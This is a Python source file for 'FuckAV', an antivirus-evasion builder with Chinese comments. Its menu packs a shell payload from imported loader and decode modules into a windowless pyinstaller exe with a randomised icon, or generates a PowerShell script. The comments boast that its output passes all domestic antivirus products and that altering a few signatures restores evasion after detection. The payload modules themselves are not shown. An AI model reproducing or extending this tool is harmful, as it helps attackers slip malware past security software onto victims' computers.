import os
import time
from colorama import init,Fore,Back,Style
from PIL import Image
from PIL import ImageDraw
from PIL import ImageFont
import powershell
import random


init(autoreset=True)
# 脚本采用python3.7编写
# 采用pyinstaller打包，使用之前请安装pyinstaller
# 运行之前先确认一下pip库有没有安装
# 因为开源了嘛，估计要不了半个月就会被加入360豪华套餐了，但是整个程序够简单，被杀了再去改几个特征码照样又可以免杀半个月
# 反正我自己用了半个月，一直都是国内杀软全过
# 保持更新，但是频率比较慢，因为我只是个没用的安服
# 不得不说这个脚本确实有很多地方是在造轮子，但是是有意造的轮子，看似造轮子，实则是为了以后方便魔改（说白了就是菜，因为我是一个没用的安服）

print(f"""
╔============================================================================╗
║                                                                            ║
║    ███████╗    ██╗   ██╗     ██████╗    ██╗  ██╗     █████╗ ██╗   ██╗      ║
║    ██╔════╝    ██║   ██║    ██╔════╝    ██║ ██╔╝    ██╔══██╗██║   ██║      ║
║    █████╗      ██║   ██║    ██║         █████╔╝     ███████║██║   ██║      ║
║    ██╔══╝      ██║   ██║    ██║         ██╔═██╗     ██╔══██║╚██╗ ██╔╝      ║
║    ██║         ╚██████╔╝    ╚██████╗    ██║  ██╗    ██║  ██║ ╚████╔╝       ║
║    ╚═╝          ╚═════╝      ╚═════╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝  ╚═══╝ V2.0   ║
║  Author:1frame                                             Time:2021-10-25 ║
╚============================================================================╝
""")
print('\033[1;31;40m''[*]''\033[1;37;40m'" exp: python FuckAV.py")
print()
print('\033[1;34;40m''[*]''\033[1;37;40m'" exe用法: 直接运行shell.exe即可 ")
print()
print('\033[1;33;40m''[*]''\033[1;37;40m'" 安装依赖库: pip install -r requirement.txt ")
print()
print("====================================================================")
print()
print('\033[1;31;40m''[1]''\033[1;37;40m'": 生成 exe")
print('\033[1;31;40m''[2]''\033[1;37;40m'": 生成 powershell脚本")
xz=input(f"""
[♥] 选择 1/2: """)

def getRandomStr():
    chars = '霖阿什顿操大撒德哈卡我被哈韩牛按客户都是嗷对啊空间很聪安徽的abcdefghigklmnopqrstu';
    charLen = len(chars)
    pwd = ''
    resultLen = random.randint(5, 7)
    while len(pwd) < resultLen:
        pwd += chars[random.randint(0,charLen-1)]
    return pwd

def GeticoDir(dir,ext = None):
  allfiles = []
  needExtFilter = (ext != None)
  for root,dirs,files in os.walk(dir):
    for filespath in files:
      filepath = os.path.join(root, filespath)
      extension = os.path.splitext(filepath)[1][1:]
      if needExtFilter and extension in ext:
        allfiles.append(filepath)
      elif not needExtFilter:
        allfiles.append(filepath)
  return allfiles

def rename_ico():
  global ico
  global rename
  rename=getRandomStr()
  ico=GeticoDir('.\\', ['ico'])[0]
  print(ico)
  os.rename(ico, '{0}.ico'.format(rename))
  ico = rename+'.ico'


def filename():
    l=open('fliename.txt','w+')
    l.write(rename)
    l.close()

if xz=="1":
        import loader
        rename_ico()
        filename()
        from decode import shellname
        os.system ("echo pyinstaller -F -w -i {0} {1}.py>{1}.bat ".format(ico,shellname))
        os.system("{0}.bat ".format(shellname))
        os.system('del {0}.py'.format(shellname))
        os.system('del {0}.bat'.format(shellname))
        os.system('del {0}.spec'.format(shellname))
        print()
        time.sleep(2)
        print('\033[1;32;40m''[♥]''\033[1;37;40m'"===================EXE打包完成====================")
        print('\033[1;34;40m''[*]''\033[1;37;40m'" exe路径:\dist\{0}.exe".format(shellname))
        os.system("pause")
        os.system("python fuckav.py")
elif xz=="2":
    powershell.powershell_fix()
